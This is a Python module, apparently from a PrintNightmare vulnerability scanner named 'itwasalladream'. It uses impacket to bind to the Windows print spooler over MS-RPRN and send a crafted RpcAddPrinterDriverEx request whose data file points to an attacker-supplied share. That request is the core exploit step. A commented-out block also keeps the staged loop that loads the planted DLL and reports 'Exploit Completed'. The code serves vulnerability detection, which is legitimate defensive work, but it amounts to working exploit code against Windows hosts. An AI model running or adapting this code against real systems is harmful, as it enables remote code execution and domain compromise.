import logging
from impacket.dcerpc.v5 import rprn
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.dtypes import NULL
from itwasalladream.structs import DRIVER_INFO_2_BLOB

log = logging.getLogger("itwasalladream.rprn_vector")

PROTOCOL = "MS-RPRN"

def connect(username, password, domain, lmhash, nthash, address, port, timeout):
    binding = r'ncacn_np:{0}[\PIPE\spoolss]'.format(address)
    rpctransport = transport.DCERPCTransportFactory(binding)

    rpctransport.set_connect_timeout(timeout)
    rpctransport.set_dport(port)
    rpctransport.setRemoteHost(address)
    
    if hasattr(rpctransport, 'set_credentials'):
        # This method exists only for selected protocol sequences.
        rpctransport.set_credentials(username, password, domain, lmhash, nthash)

    log.debug(f"Connecting to {binding}")
    dce = rpctransport.get_dce_rpc()
    dce.connect()
    dce.bind(rprn.MSRPC_UUID_RPRN)
    log.debug("Bind OK")

    return dce

def getDrivers(dce, handle=NULL):
    #get drivers
    resp = rprn.hRpcEnumPrinterDrivers(dce, pName=handle, pEnvironment="Windows x64\x00", Level=2)
    data = b''.join(resp['pDrivers'])

    #parse drivers
    blob = DRIVER_INFO_2_BLOB()
    blob.fromString(data)
    #blob.dump()
    
    return blob


def exploit(dce, pDriverPath, share, handle=NULL):
    #build DRIVER_CONTAINER package
    container_info = rprn.DRIVER_CONTAINER()
    container_info['Level'] = 2
    container_info['DriverInfo']['tag'] = 2
    container_info['DriverInfo']['Level2']['cVersion']     = 3
    container_info['DriverInfo']['Level2']['pName']        = "1234\x00"
    container_info['DriverInfo']['Level2']['pEnvironment'] = "Windows x64\x00"
    container_info['DriverInfo']['Level2']['pDriverPath']  = pDriverPath + '\x00'
    container_info['DriverInfo']['Level2']['pDataFile']    = "{0}\x00".format(share)
    container_info['DriverInfo']['Level2']['pConfigFile']  = "C:\\Windows\\System32\\winhttp.dll\x00"
    
    flags = rprn.APD_COPY_ALL_FILES | 0x10 | 0x8000
    filename = share.split("\\")[-1]

    log.debug("Calling rprn.hRpcAddPrinterDriverEx()")
    resp = rprn.hRpcAddPrinterDriverEx(dce, pName=handle, pDriverContainer=container_info, dwFileCopyFlags=flags)

    # Below is not needed since we're not trying to actually exploit anything. First response from rprn.hRpcAddPrinterDriverEx is (usually) enough to determine if host is vulnerable.
    """
    log.debug(f"Stage0: {resp['ErrorCode']}")

    container_info['DriverInfo']['Level2']['pConfigFile']  = "C:\\Windows\\System32\\kernelbase.dll\x00"
    for i in range(1, 30):
        try:
            container_info['DriverInfo']['Level2']['pConfigFile'] = f"C:\\Windows\\System32\\spool\\drivers\\x64\\3\\old\\{i}\\{filename}\x00"
            resp = rprn.hRpcAddPrinterDriverEx(dce, pName=handle, pDriverContainer=container_info, dwFileCopyFlags=flags)
            log.debug(f"Stage{i}: {resp['ErrorCode']}")
            if (resp['ErrorCode'] == 0):
                log.debug("Exploit Completed")
                return
        except Exception as e:
            #print(e)
            pass
    """
